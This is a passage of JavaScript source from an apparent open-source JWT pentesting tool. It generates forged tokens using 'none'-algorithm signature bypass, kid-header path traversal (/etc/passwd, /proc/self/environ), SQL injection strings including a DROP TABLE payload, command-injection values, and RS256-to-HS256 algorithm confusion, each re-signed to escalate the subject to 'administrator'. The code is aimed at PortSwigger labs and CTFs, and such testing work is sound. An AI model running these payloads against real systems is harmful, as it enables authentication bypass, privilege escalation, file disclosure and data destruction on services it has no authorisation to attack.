/*!
 * JWTAuditor - JWT Attack Platform (Production Version)
 * https://github.com/dr34mhacks/jwtauditor
 * Copyright (c) 2025 Sid Joshi (@dr34mhacks)
 * Licensed under Apache-2.0 License
 */


// Production JWT Attack Platform - Only None Algorithm Bypass enabled
window.jwtAttackPlatform = {
    currentStep: 'attack-selection',
    selectedAttack: null,
    generatedPayloads: [],
    
    init: function() {
        this.setupEvents();
        this.disableUnavailableAttacks();
    },
    
    setupEvents: function() {
        document.addEventListener('click', (e) => {
            // Check if in attacks tab
            const attacksTab = document.getElementById('attacks');
            if (!attacksTab || !attacksTab.classList.contains('active')) {
                return;
            }

            
            // Handle back button clicks
            if (e.target.id === 'attack-back-btn' || e.target.closest('#attack-back-btn')) {
                this.goBack();
                return;
            }
            
            // Handle results back button
            if (e.target.id === 'results-back-btn' || e.target.closest('#results-back-btn')) {
                this.backToConfiguration();
                return;
            }
            
            // Handle generate attack button
            if (e.target.classList.contains('generate-attack-btn')) {
                e.preventDefault();
                this.generateAttackPayloads().catch(error => {
                    console.error('Attack generation failed:', error);
                    this.showError(`Attack generation failed: ${error.message}`);
                });
                return;
            }
            
            // Handle copy payload button
            if (e.target.classList.contains('copy-payload-icon') || e.target.closest('.copy-payload-icon')) {
                const button = e.target.classList.contains('copy-payload-icon') ? e.target : e.target.closest('.copy-payload-icon');
                const payload = decodeURIComponent(button.dataset.payload);
                navigator.clipboard.writeText(payload).then(() => {
                    const originalHTML = button.innerHTML;
                    button.innerHTML = '<i class="fas fa-check"></i>';
                    setTimeout(() => {
                        button.innerHTML = originalHTML;
                    }, 2000);
                });
                return;
            }
            
            // Handle export buttons
            if (e.target.id === 'export-payloads' || e.target.textContent.includes('Export All Payloads')) {
                this.exportAllPayloads();
                return;
            }
            
            if (e.target.id === 'export-clean-payloads' || e.target.textContent.includes('Export Clean Tokens')) {
                this.exportCleanTokens();
                return;
            }
            
            if (e.target.id === 'generate-new-attack' || e.target.textContent.includes('Generate New Attack')) {
                this.goBack();
                return;
            }
            
            // Handle attack cards - all enabled attacks
            const card = e.target.closest('.attack-card');
            if (card && !card.classList.contains('disabled')) {
                const attackType = card.dataset.attack;

                // Enable all attack types
                if (['none-bypass', 'kid-injection', 'algo-confusion', 'jku-manipulation', 'jwk-injection', 'privilege-escalation', 'claim-spoofing'].includes(attackType)) {
                    // Select the card
                    document.querySelectorAll('.attack-card').forEach(c => c.classList.remove('selected'));
                    card.classList.add('selected');

                    this.selectedAttack = attackType;

                    // Show configuration
                    setTimeout(() => {
                        this.showConfiguration();
                    }, 300);
                } else {
                    // Show unavailable message for other attacks
                    this.showUnavailableMessage(attackType);
                }
            }
        });
        
        // Add change event listener for checkboxes
        document.addEventListener('change', (e) => {
            // Handle payload modification checkbox for none bypass
            if (e.target.id === 'modify-payload-none') {
                const customClaimsContainer = document.getElementById('custom-claims-container-none');
                if (customClaimsContainer) {
                    customClaimsContainer.style.display = e.target.checked ? 'block' : 'none';
                }
            }
        });
    },
    
    disableUnavailableAttacks: function() {
        // Enable all implemented attacks
        const enabledAttacks = ['none-bypass', 'kid-injection', 'algo-confusion', 'jku-manipulation', 'jwk-injection', 'privilege-escalation', 'claim-spoofing'];
        const attackCards = document.querySelectorAll('.attack-card');
        attackCards.forEach(card => {
            const attackType = card.dataset.attack;
            if (!enabledAttacks.includes(attackType)) {
                card.classList.add('disabled');
                card.style.opacity = '0.5';
                card.style.cursor = 'not-allowed';
                
                // Add "Coming Soon" badge
                if (!card.querySelector('.coming-soon-badge')) {
                    const badge = document.createElement('div');
                    badge.className = 'coming-soon-badge';
                    badge.innerHTML = 'üîí Coming Soon';
                    card.style.position = 'relative';
                    card.appendChild(badge);
                }
            }
        });
    },
    
    showUnavailableMessage: function(attackType) {
        const attackNames = {
            'algo-confusion': 'Algorithm Confusion',
            'kid-injection': 'Kid Parameter Injection',
            'jku-manipulation': 'JKU/X5U Manipulation',
            'jwk-injection': 'JWK Header Injection',
            'privilege-escalation': 'Privilege Escalation',
            'claim-spoofing': 'Claim Spoofing'
        };
        
        const attackName = attackNames[attackType] || 'This attack';
        
        // Create modal or notification
        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: var(--dark-surface);
            border: 2px solid var(--primary-color);
            border-radius: 8px;
            padding: 20px;
            max-width: 400px;
            text-align: center;
            z-index: 1000;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
        `;
        
        notification.innerHTML = `
            <h3 style="color: var(--primary-color); margin-bottom: 15px;">üîí Attack Coming Soon</h3>
            <p style="color: var(--text-primary); margin-bottom: 15px;">
                <strong>${attackName}</strong> is currently under development and will be available in a future update.
            </p>
            <p style="color: var(--text-secondary); font-size: 14px; margin-bottom: 20px;">
                For now, you can use the <strong>None Algorithm Bypass</strong> attack which is fully functional.
            </p>
            <button onclick="this.parentElement.remove()" style="
                background: var(--primary-color);
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 4px;
                cursor: pointer;
            ">OK</button>
        `;
        
        document.body.appendChild(notification);
        
        // Auto-remove after 5 seconds
        setTimeout(() => {
            if (notification.parentElement) {
                notification.remove();
            }
        }, 5000);
    },
    
    showConfiguration: function() {
        const attackSelection = document.getElementById('attack-selection');
        const attackConfiguration = document.getElementById('attack-configuration');
        const configContent = document.getElementById('attack-config-content');
        const configTitle = document.getElementById('attack-config-title');
        
        if (!attackSelection || !attackConfiguration || !configContent || !configTitle) {
            return;
        }
        
        // Hide selection, show configuration
        attackSelection.classList.remove('active');
        attackConfiguration.classList.add('active');
        
        // Update current step
        this.currentStep = 'attack-configuration';
        
        // Generate configuration based on selected attack
        const attackConfigs = {
            'none-bypass': {
                title: 'Configure None Algorithm Bypass',
                content: () => this.generateNoneBypassConfig()
            },
            'kid-injection': {
                title: 'Configure Kid Parameter Injection',
                content: () => this.generateKidInjectionConfig()
            },
            'algo-confusion': {
                title: 'Configure Algorithm Confusion Attack',
                content: () => this.generateAlgoConfusionConfig()
            },
            'jku-manipulation': {
                title: 'Configure JKU/X5U Manipulation',
                content: () => this.generateJkuManipulationConfig()
            },
            'jwk-injection': {
                title: 'Configure JWK Header Injection',
                content: () => this.generateJwkInjectionConfig()
            },
            'privilege-escalation': {
                title: 'Configure Privilege Escalation',
                content: () => this.generatePrivilegeEscalationConfig()
            },
            'claim-spoofing': {
                title: 'Configure Claim Spoofing',
                content: () => this.generateClaimSpoofingConfig()
            }
        };

        const config = attackConfigs[this.selectedAttack];
        if (config) {
            configTitle.textContent = config.title;
            configContent.innerHTML = config.content();
        }
    },
    
    generateNoneBypassConfig: function() {
        return `
            <div class="config-section">
                <h4>üö´ None Algorithm Bypass Attack</h4>
                <p class="attack-description">
                    This attack removes signature verification by setting the algorithm to "none". 
                    Many JWT libraries will accept tokens with alg: "none" and skip signature validation entirely.
                </p>
                
                <div class="config-group">
                    <label for="original-token-none">Original JWT Token *</label>
                    <textarea id="original-token-none" placeholder="Paste your JWT token here..." rows="4"></textarea>
                    <small class="field-hint">üìù Paste the JWT token you want to modify</small>
                </div>
                
                <div class="config-group">
                    <label class="checkbox-label">
                        <input type="checkbox" id="modify-payload-none">
                        <span class="checkmark"></span>
                        Modify Payload Claims
                    </label>
                    <small class="field-hint">üîß Check this to add or modify claims in the payload</small>
                </div>
                
                <div class="config-group" id="custom-claims-container-none" style="display: none;">
                    <label for="custom-claims-none">Custom Claims (JSON)</label>
                    <textarea id="custom-claims-none" placeholder='{"sub": "admin", "role": "administrator"}' rows="3"></textarea>
                    <small class="field-hint">üéØ Add custom claims in JSON format. These will be merged with existing payload.</small>
                </div>
                
                <div class="config-actions">
                    <button class="generate-attack-btn primary-btn">
                        <i class="fas fa-rocket"></i> Generate None Bypass Payloads
                    </button>
                </div>
            </div>
        `;
    },

    generateKidInjectionConfig: function() {
        return `
            <div class="config-section">
                <h4>üíâ Kid Parameter Injection Attack</h4>
                <p class="attack-description">
                    This attack exploits the "kid" (Key ID) parameter in JWT headers for SQL injection,
                    path traversal, and command injection vulnerabilities. The attack targets applications
                    that use the kid value to retrieve keys from databases or file systems.
                </p>

                <div class="config-group">
                    <label for="original-token-kid">Original JWT Token *</label>
                    <textarea id="original-token-kid" placeholder="Paste your JWT token here..." rows="4"></textarea>
                    <small class="field-hint">üìù Paste the JWT token you want to modify</small>
                </div>

                <div class="config-group checkbox-group">
                    <label>
                        <input type="checkbox" id="modify-payload-kid" checked>
                        <span class="checkmark"></span>
                        Modify Token Payload
                    </label>
                    <small class="field-hint">üîß Enable payload modification for privilege escalation</small>
                </div>

                <div class="config-group" id="custom-claims-group-kid">
                    <label for="custom-claims-kid">Custom Claims (JSON)</label>
                    <textarea id="custom-claims-kid" placeholder='{"sub": "admin", "role": "administrator", "iat": 9999999999}' rows="3"></textarea>
                    <small class="field-hint">‚ö° Add custom claims to test privilege escalation</small>
                </div>

                <div class="config-group">
                    <label for="target-file-kid">Target File Path (Optional)</label>
                    <input type="text" id="target-file-kid" placeholder="/etc/passwd">
                    <small class="field-hint">üéØ Specify a custom target file for path traversal attacks</small>
                </div>

                <div class="attack-info">
                    <h5>üîç Attack Vectors Generated:</h5>
                    <ul>
                        <li><strong>SQL Injection:</strong> Classic SQLi payloads for database key retrieval</li>
                        <li><strong>Path Traversal:</strong> Directory traversal to access system files</li>
                        <li><strong>Command Injection:</strong> OS command execution via kid parameter</li>
                        <li><strong>File System:</strong> Access to sensitive system files and logs</li>
                        <li><strong>Web Application:</strong> Framework-specific configuration files</li>
                    </ul>
                </div>

                <div class="config-actions">
                    <button class="generate-attack-btn" data-attack="kid-injection">
                        <i class="fas fa-rocket"></i> Generate KID Injection Payloads
                    </button>
                </div>
            </div>
        `;
    },
    
    async generateAttackPayloads() {
        const payloadGenerators = {
            'none-bypass': () => this.generateNoneBypassPayloads(),
            'kid-injection': () => this.generateKidInjectionPayloads(),
            'algo-confusion': () => this.generateAlgoConfusionPayloads(),
            'jku-manipulation': () => this.generateJkuManipulationPayloads(),
            'jwk-injection': () => this.generateJwkInjectionPayloads(),
            'privilege-escalation': () => this.generatePrivilegeEscalationPayloads(),
            'claim-spoofing': () => this.generateClaimSpoofingPayloads()
        };

        const generator = payloadGenerators[this.selectedAttack];
        if (generator) {
            try {
                // Show loading state
                const generateBtn = document.querySelector('.generate-attack-btn');
                if (generateBtn) {
                    generateBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Generating & Signing Payloads...';
                    generateBtn.disabled = true;
                }

                await generator();

                // Reset button state
                if (generateBtn) {
                    generateBtn.innerHTML = '<i class="fas fa-rocket"></i> Generate Attack Payloads';
                    generateBtn.disabled = false;
                }

                if (this.generatedPayloads.length > 0) {
                    this.showResults();
                } else {
                    this.showError('No payloads were generated. Please check your configuration.');
                }
            } catch (error) {
                this.showError(`Failed to generate payloads: ${error.message}`);

                // Reset button state on error
                const generateBtn = document.querySelector('.generate-attack-btn');
                if (generateBtn) {
                    generateBtn.innerHTML = '<i class="fas fa-rocket"></i> Generate Attack Payloads';
                    generateBtn.disabled = false;
                }
            }
        }
    },
    
    generateNoneBypassPayloads: function() {
        const token = document.getElementById('original-token-none')?.value?.trim();
        const modifyPayload = document.getElementById('modify-payload-none')?.checked;
        const customClaims = document.getElementById('custom-claims-none')?.value?.trim();
        
        if (!token) {
            this.showError('Please provide the original JWT token');
            return;
        }
        
        try {
            const decodedToken = this.decodeJWT(token);
            this.generatedPayloads = [];
            
            // Prepare payload variations
            let basePayload = { ...decodedToken.payload };
            
            // Apply custom claims if specified
            if (modifyPayload && customClaims) {
                try {
                    const cleanedClaims = customClaims.trim();
                    const additionalClaims = JSON.parse(cleanedClaims);
                    basePayload = { ...basePayload, ...additionalClaims };
                } catch (e) {
                    this.showError(`Invalid JSON in custom claims: ${e.message}. Please check your JSON format.`);
                }
            }
            
            // Generate none algorithm variations
            const noneVariations = [
                { alg: 'none', description: 'Standard none algorithm' },
                { alg: 'None', description: 'Capitalized None' },
                { alg: 'NONE', description: 'Uppercase NONE' },
                { alg: 'nOnE', description: 'Mixed case nOnE' }
            ];
            
            noneVariations.forEach(variation => {
                const header = { ...decodedToken.header, alg: variation.alg };
                
                // Remove typ if present (some implementations are stricter)
                const headerWithoutTyp = { ...header };
                delete headerWithoutTyp.typ;
                
                // Generate tokens with and without signature
                [header, headerWithoutTyp].forEach((headerVariant, index) => {
                    const encodedHeader = this.base64UrlEncode(JSON.stringify(headerVariant));
                    const encodedPayload = this.base64UrlEncode(JSON.stringify(basePayload));
                    
                    // Token without signature
                    const tokenWithoutSig = `${encodedHeader}.${encodedPayload}.`;
                    
                    // Token with empty signature  
                    const tokenWithEmptySig = `${encodedHeader}.${encodedPayload}`;
                    
                    const headerType = index === 0 ? 'with typ' : 'without typ';
                    
                    this.generatedPayloads.push({
                        title: `üö´ None Algorithm (${variation.description}, ${headerType}) - No Signature`,
                        payload: tokenWithoutSig,
                        description: `None algorithm bypass using alg: "${variation.alg}" ${headerType}, ending with empty signature`,
                        explanation: `This payload removes signature verification by setting algorithm to "${variation.alg}". The token ends with a period and empty signature section.`,
                        testMethod: 'Submit this token to endpoints that normally require JWT signature verification.'
                    });
                    
                    this.generatedPayloads.push({
                        title: `üö´ None Algorithm (${variation.description}, ${headerType}) - Missing Signature`,
                        payload: tokenWithEmptySig,
                        description: `None algorithm bypass using alg: "${variation.alg}" ${headerType}, completely missing signature section`,
                        explanation: `This payload removes signature verification by setting algorithm to "${variation.alg}". The token has no signature section at all.`,
                        testMethod: 'Submit this token to endpoints that normally require JWT signature verification.'
                    });
                });
            });
            
        } catch (error) {
            this.showError(`Failed to process none algorithm bypass: ${error.message}`);
        }
    },

    async generateKidInjectionPayloads() {
        const token = document.getElementById('original-token-kid')?.value?.trim();
        const modifyPayload = document.getElementById('modify-payload-kid')?.checked;
        const customClaims = document.getElementById('custom-claims-kid')?.value?.trim();
        const targetFile = document.getElementById('target-file-kid')?.value?.trim() || '/dev/null';

        if (!token) {
            this.showError('Please provide the original JWT token');
            return;
        }

        try {
            const decodedToken = this.decodeJWT(token);
            this.generatedPayloads = [];

            // Prepare payload variations
            let basePayload = { ...decodedToken.payload };

            // Apply custom claims if specified
            if (modifyPayload && customClaims) {
                try {
                    const cleanedClaims = customClaims.trim();
                    const additionalClaims = JSON.parse(cleanedClaims);
                    basePayload = { ...basePayload, ...additionalClaims };
                } catch (e) {
                    this.showError(`Invalid JSON in custom claims: ${e.message}. Please check your JSON format.`);
                    return;
                }
            }

            // PortSwigger Lab Specific Payloads - Path Traversal with ACTUAL SIGNING
            const pathTraversalPayloads = [
                { path: "/dev/null", desc: "Null device (empty key)" },
                { path: "../../../../../../../dev/null", desc: "Deep traversal to /dev/null" },
                { path: "../../../../../../../../dev/null", desc: "Extra deep traversal" },
                { path: "/proc/self/environ", desc: "Process environment variables" },
                { path: "/etc/passwd", desc: "Unix passwd file" },
                { path: "../../../etc/passwd", desc: "Relative path to passwd" },
                { path: "/proc/version", desc: "System version info" },
                { path: "", desc: "Empty string (null key)" },
                { path: " ", desc: "Single space character" },
            ];

            // SQL Injection payloads (for databases that store keys)
            const sqlPayloads = [
                { path: "' OR 1=1--", desc: "Classic SQL injection", key: "secret" },
                { path: "' UNION SELECT 'secret'--", desc: "Union injection with known secret", key: "secret" },
                { path: "'; DROP TABLE keys;--", desc: "Destructive SQL injection", key: "secret" },
            ];

            // Command injection payloads
            const commandPayloads = [
                { path: "; echo 'secret'", desc: "Command injection echo", key: "secret" },
                { path: "| echo secret", desc: "Pipe command injection", key: "secret" },
                { path: "`echo secret`", desc: "Command substitution", key: "secret" },
            ];

            // Generate path traversal attacks with proper signing
            for (const payload of pathTraversalPayloads) {
                const header = { ...decodedToken.header };
                header.kid = payload.path;
                header.alg = 'HS256'; // Force HMAC algorithm

                const signingKey = this.getFileBasedSigningKey(payload.path);

                try {
                    const signedToken = await this.signJwtHmac(header, basePayload, signingKey, 'HS256');

                    this.generatedPayloads.push({
                        title: `üìÅ Path Traversal - ${payload.desc}`,
                        payload: signedToken,
                        description: `KID path traversal: ${payload.path}`,
                        explanation: `This payload uses path traversal to make the server use file content as HMAC key. KID: "${payload.path}". The token is properly signed with the expected file content (${signingKey instanceof Uint8Array ? 'null bytes' : signingKey}).`,
                        testMethod: `Submit this properly signed token. The server should accept it if it uses the file content from "${payload.path}" as the HMAC key.`
                    });

                    // Add administrator privilege escalation version
                    if (basePayload.sub && basePayload.sub !== 'administrator') {
                        const adminPayload = { ...basePayload, sub: 'administrator' };
                        const adminToken = await this.signJwtHmac(header, adminPayload, signingKey, 'HS256');

                        this.generatedPayloads.push({
                            title: `üîê Admin Escalation via ${payload.desc}`,
                            payload: adminToken,
                            description: `Admin escalation with KID: ${payload.path}`,
                            explanation: `This payload combines path traversal with privilege escalation. Changes subject to "administrator" and signs with file content from "${payload.path}".`,
                            testMethod: `Submit this token to gain administrator access. Perfect for PortSwigger lab scenarios.`
                        });
                    }
                } catch (signingError) {
                    console.warn(`Failed to sign token for ${payload.path}:`, signingError);
                }
            }

            // SQL injection attacks (signed with predicted keys)
            for (const payload of sqlPayloads) {
                const header = { ...decodedToken.header };
                header.kid = payload.path;
                header.alg = 'HS256';

                try {
                    const signedToken = await this.signJwtHmac(header, basePayload, payload.key, 'HS256');

                    this.generatedPayloads.push({
                        title: `üóÑÔ∏è SQL Injection - ${payload.desc}`,
                        payload: signedToken,
                        description: `SQL injection in KID: ${payload.path}`,
                        explanation: `This payload uses SQL injection in the KID parameter. Signed with predicted key: "${payload.key}".`,
                        testMethod: `Submit this token if the application retrieves keys from database. Monitor for SQL errors or successful authentication.`
                    });
                } catch (signingError) {
                    console.warn(`Failed to sign SQL injection token:`, signingError);
                }
            }

            // Command injection attacks
            for (const payload of commandPayloads) {
                const header = { ...decodedToken.header };
                header.kid = payload.path;
                header.alg = 'HS256';

                try {
                    const signedToken = await this.signJwtHmac(header, basePayload, payload.key, 'HS256');

                    this.generatedPayloads.push({
                        title: `‚ö° Command Injection - ${payload.desc}`,
                        payload: signedToken,
                        description: `Command injection in KID: ${payload.path}`,
                        explanation: `This payload uses command injection in the KID parameter. Signed with expected output: "${payload.key}".`,
                        testMethod: `Submit this token if the application processes KID in command context. Monitor for command execution or authentication success.`
                    });
                } catch (signingError) {
                    console.warn(`Failed to sign command injection token:`, signingError);
                }
            }

            // Custom target file (if provided)
            if (targetFile && targetFile !== '/dev/null') {
                const header = { ...decodedToken.header };
                header.kid = targetFile;
                header.alg = 'HS256';

                const customKey = this.getFileBasedSigningKey(targetFile);

                try {
                    const customToken = await this.signJwtHmac(header, basePayload, customKey, 'HS256');

                    this.generatedPayloads.push({
                        title: `üéØ Custom Target - ${targetFile}`,
                        payload: customToken,
                        description: `Custom file targeting: ${targetFile}`,
                        explanation: `This payload targets your custom file: "${targetFile}". Properly signed with predicted file content.`,
                        testMethod: `Submit this token and monitor for successful authentication using the custom file as key.`
                    });
                } catch (signingError) {
                    console.warn(`Failed to sign custom target token:`, signingError);
                }
            }

        } catch (error) {
            this.showError(`Failed to process KID injection attack: ${error.message}`);
        }
    },

    getTestingGuidance: function(category) {
        const guidance = {
            'SQL Injection': 'database errors, delayed responses, or unauthorized access',
            'Path Traversal': 'file system errors, authentication bypass, or sensitive data exposure',
            'Command Injection': 'command output in responses, delayed responses, or system compromise',
            'File System': 'file access errors, system information leakage, or authentication bypass',
            'Web Application': 'configuration errors, database credentials, or application secrets'
        };
        return guidance[category] || 'unusual application behavior or security vulnerabilities';
    },
    
    showResults: function() {
        const attackConfiguration = document.getElementById('attack-configuration');
        const attackResults = document.getElementById('attack-results');
        const resultsContent = document.getElementById('attack-results-content');
        
        if (!attackConfiguration || !attackResults || !resultsContent) {
            return;
        }
        
        // Hide configuration, show results
        attackConfiguration.classList.remove('active');
        attackResults.classList.add('active');
        
        // Update current step
        this.currentStep = 'attack-results';
        
        // Generate results HTML
        let html = `
            <div class="results-summary">
                <h4>üéØ Generated ${this.generatedPayloads.length} Attack Payloads</h4>
                <p>Each payload below represents a different variation of the ${this.selectedAttack} attack.</p>
            </div>
        `;
        
        this.generatedPayloads.forEach((payloadData, index) => {
            html += `
                <div class="payload-result">
                    <h5 class="payload-title">${payloadData.title}</h5>
                    <div class="payload-container">
                        <div class="payload-token">${payloadData.payload}</div>
                        <button class="copy-payload-icon" data-payload="${encodeURIComponent(payloadData.payload)}" title="Copy payload">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                    <div class="payload-info">
                        <div class="payload-description">
                            <strong>Description:</strong> ${payloadData.description}
                        </div>
                        <div class="payload-explanation">
                            <strong>How it works:</strong> ${payloadData.explanation}
                        </div>
                        <div class="payload-test-method">
                            <strong>Testing method:</strong> ${payloadData.testMethod}
                        </div>
                    </div>
                </div>
            `;
        });
        
        resultsContent.innerHTML = html;
    },
    
    goBack: function() {
        if (this.currentStep === 'attack-configuration') {
            // Go back to attack selection
            const attackConfiguration = document.getElementById('attack-configuration');
            const attackSelection = document.getElementById('attack-selection');
            
            if (attackConfiguration && attackSelection) {
                attackConfiguration.classList.remove('active');
                attackSelection.classList.add('active');
                this.currentStep = 'attack-selection';
                this.selectedAttack = null;
            }
        } else if (this.currentStep === 'attack-results') {
            // Go back to configuration
            this.backToConfiguration();
        }
    },
    
    backToConfiguration: function() {
        const attackResults = document.getElementById('attack-results');
        const attackConfiguration = document.getElementById('attack-configuration');
        
        if (attackResults && attackConfiguration) {
            attackResults.classList.remove('active');
            attackConfiguration.classList.add('active');
            this.currentStep = 'attack-configuration';
        }
    },
    
    exportAllPayloads: function() {
        if (this.generatedPayloads.length === 0) {
            this.showError('No payloads to export. Please generate attack payloads first.');
            return;
        }
        
        let exportContent = `JWT Attack Platform - ${this.selectedAttack} Export\n`;
        exportContent += `Generated: ${new Date().toLocaleString()}\n`;
        exportContent += `Total Payloads: ${this.generatedPayloads.length}\n\n`;
        exportContent += '=' .repeat(80) + '\n\n';
        
        this.generatedPayloads.forEach((payload, index) => {
            exportContent += `${index + 1}. ${payload.title}\n`;
            exportContent += `Description: ${payload.description}\n`;
            exportContent += `Explanation: ${payload.explanation}\n`;
            exportContent += `Testing: ${payload.testMethod}\n`;
            exportContent += `Payload: ${payload.payload}\n\n`;
            exportContent += '-'.repeat(80) + '\n\n';
        });
        
        this.downloadFile(exportContent, `jwt_attack_${this.selectedAttack}_${Date.now()}.txt`);
    },
    
    exportCleanTokens: function() {
        if (this.generatedPayloads.length === 0) {
            this.showError('No payloads to export. Please generate attack payloads first.');
            return;
        }
        
        let exportContent = '';
        
        this.generatedPayloads.forEach((payload, index) => {
            exportContent += `${payload.payload}\n`;
        });
        
        this.downloadFile(exportContent, `jwt_tokens_${this.selectedAttack}_${Date.now()}.txt`);
    },
    
    downloadFile: function(content, filename) {
        const blob = new Blob([content], { type: 'text/plain' });
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        window.URL.revokeObjectURL(url);
    },
    
    showError: function(message) {
        
        // Create or update error display
        let errorDiv = document.getElementById('attack-error-display');
        if (!errorDiv) {
            errorDiv = document.createElement('div');
            errorDiv.id = 'attack-error-display';
            errorDiv.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                background: #ff4757;
                color: white;
                padding: 15px;
                border-radius: 5px;
                max-width: 400px;
                z-index: 1000;
                box-shadow: 0 2px 10px rgba(0,0,0,0.2);
            `;
            document.body.appendChild(errorDiv);
        }
        
        errorDiv.innerHTML = `
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <span><i class="fas fa-exclamation-triangle"></i> ${message}</span>
                <button onclick="this.parentElement.parentElement.remove()" style="background: none; border: none; color: white; cursor: pointer; font-size: 16px;">√ó</button>
            </div>
        `;
        
        // Auto-remove after 5 seconds
        setTimeout(() => {
            if (errorDiv.parentElement) {
                errorDiv.remove();
            }
        }, 5000);
    },
    
    // Utility functions
    decodeJWT: function(token) {
        const parts = token.split('.');
        if (parts.length !== 3) {
            throw new Error('Invalid JWT format. Expected 3 parts separated by dots.');
        }
        
        try {
            const header = JSON.parse(this.base64UrlDecode(parts[0]));
            const payload = JSON.parse(this.base64UrlDecode(parts[1]));
            const signature = parts[2];
            
            return { header, payload, signature };
        } catch (error) {
            throw new Error(`Failed to decode JWT: ${error.message}`);
        }
    },
    
    // =================== ALGORITHM CONFUSION ATTACK ===================
    generateAlgoConfusionConfig: function() {
        return `
            <div class="config-section">
                <h4>üîÑ Algorithm Confusion Attack</h4>
                <p class="attack-description">
                    This attack exploits the weakness where applications accept multiple algorithm types.
                    It converts asymmetric algorithms (RS256/RS384/RS512) to symmetric (HS256/HS384/HS512)
                    using the public key as the HMAC secret.
                </p>

                <div class="config-group">
                    <label for="original-token-algo">Original JWT Token *</label>
                    <textarea id="original-token-algo" placeholder="Paste your JWT token here (preferably RS256/RS384/RS512)..." rows="4"></textarea>
                    <small class="field-hint">üìù Token should use asymmetric algorithm (RS*/ES*/PS*)</small>
                </div>

                <div class="config-group">
                    <label for="public-key-algo">Public Key (PEM Format)</label>
                    <textarea id="public-key-algo" placeholder="-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----" rows="6"></textarea>
                    <small class="field-hint">üîë Public key to use as HMAC secret</small>
                </div>

                <div class="config-group">
                    <label for="jwks-content-algo">OR JWKS Content (JSON)</label>
                    <textarea id="jwks-content-algo" placeholder='{"keys":[{"kty":"RSA","use":"sig","kid":"...","n":"...","e":"AQAB"}]}' rows="4"></textarea>
                    <small class="field-hint">üìã JWKS will be converted to PEM format automatically</small>
                </div>

                <div class="config-group checkbox-group">
                    <label>
                        <input type="checkbox" id="modify-payload-algo" checked>
                        <span class="checkmark"></span>
                        Modify Token Payload
                    </label>
                    <small class="field-hint">üîß Enable payload modification for privilege escalation</small>
                </div>

                <div class="config-group" id="custom-claims-group-algo">
                    <label for="custom-claims-algo">Custom Claims (JSON)</label>
                    <textarea id="custom-claims-algo" placeholder='{"sub": "admin", "role": "administrator", "iat": 9999999999}' rows="3"></textarea>
                    <small class="field-hint">‚ö° Add custom claims to test privilege escalation</small>
                </div>

                <div class="attack-info">
                    <h5>üîç Comprehensive Algorithm Confusion Coverage:</h5>
                    <ul>
                        <li><strong>üéØ PortSwigger Labs:</strong> x.509 PEM with newline (proven working)</li>
                        <li><strong>üèÜ CTF Challenges:</strong> PKCS1 format, DER bytes, minimal RSA</li>
                        <li><strong>üìã Legacy Systems:</strong> Various PEM formats and encodings</li>
                        <li><strong>üîß Edge Cases:</strong> Empty secrets, null keys, double encoding</li>
                        <li><strong>üõ°Ô∏è Multi-Algorithm:</strong> RS256/384/512 ‚Üí HS256/384/512</li>
                    </ul>
                    <p class="field-hint">
                        <strong>üöÄ Total Coverage:</strong> 14 different attack variations covering PortSwigger Labs,
                        CTF challenges, legacy systems, and vulnerable implementations found in real-world pentesting.
                    </p>
                </div>

                <div class="config-actions">
                    <button class="generate-attack-btn" data-attack="algo-confusion">
                        <i class="fas fa-rocket"></i> Generate Algorithm Confusion Payloads
                    </button>
                </div>
            </div>
        `;
    },

    async generateAlgoConfusionPayloads() {
        const token = document.getElementById('original-token-algo')?.value?.trim();
        const publicKey = document.getElementById('public-key-algo')?.value?.trim();
        const jwksContent = document.getElementById('jwks-content-algo')?.value?.trim();
        const modifyPayload = document.getElementById('modify-payload-algo')?.checked;
        const customClaims = document.getElementById('custom-claims-algo')?.value?.trim();

        if (!token) {
            this.showError('Please provide the original JWT token');
            return;
        }

        if (!publicKey && !jwksContent) {
            this.showError('Please provide either the public key or JWKS content');
            return;
        }

        try {
            const decodedToken = this.decodeJWT(token);
            this.generatedPayloads = [];

            // Prepare payload variations
            let basePayload = { ...decodedToken.payload };

            // PortSwigger lab specific: Change sub to administrator for privilege escalation
            const adminPayload = { ...basePayload, sub: 'administrator' };

            // Apply custom claims if specified
            if (modifyPayload && customClaims) {
                try {
                    const additionalClaims = JSON.parse(customClaims);
                    basePayload = { ...basePayload, ...additionalClaims };
                } catch (e) {
                    this.showError(`Invalid JSON in custom claims: ${e.message}`);
                    return;
                }
            }

            // Convert JWKS to PEM if provided
            let pemKey = publicKey;
            if (jwksContent && !publicKey) {
                try {
                    pemKey = this.convertJwksToPem(jwksContent);
                    // Display the converted PEM
                    this.showPemConversion(pemKey);
                } catch (e) {
                    this.showError(`Failed to convert JWKS to PEM: ${e.message}`);
                    return;
                }
            }

            // Generate PKCS1 format from X.509 PEM for comprehensive testing
            const pkcs1Key = this.convertX509ToPKCS1(pemKey);

            // Comprehensive algorithm confusion mappings covering all CTF and real-world edge cases
            const algorithmMappings = [
                // PortSwigger Labs (Working)
                { from: 'RS256', to: 'HS256', desc: 'üéØ x.509 PEM with newline (PortSwigger Labs)', payload: adminPayload, secret: pemKey },

                // CTF Common Variations
                { from: 'RS256', to: 'HS256', desc: 'üèÜ PKCS1 PEM format (CTF Common)', payload: adminPayload, secret: 'PKCS1_PEM' },
                { from: 'RS256', to: 'HS256', desc: 'üìú x.509 PEM without newline (Legacy)', payload: adminPayload, secret: pemKey.replace(/\n$/, '') },
                { from: 'RS256', to: 'HS256', desc: 'üî¢ Raw DER bytes (Binary Format)', payload: adminPayload, secret: 'DER_BYTES' },
                { from: 'RS256', to: 'HS256', desc: 'üìã Base64 content only (No Headers)', payload: adminPayload, secret: pemKey.replace(/-----BEGIN PUBLIC KEY-----/g, '').replace(/-----END PUBLIC KEY-----/g, '').replace(/\r?\n|\r/g, '') },

                // Advanced CTF Edge Cases
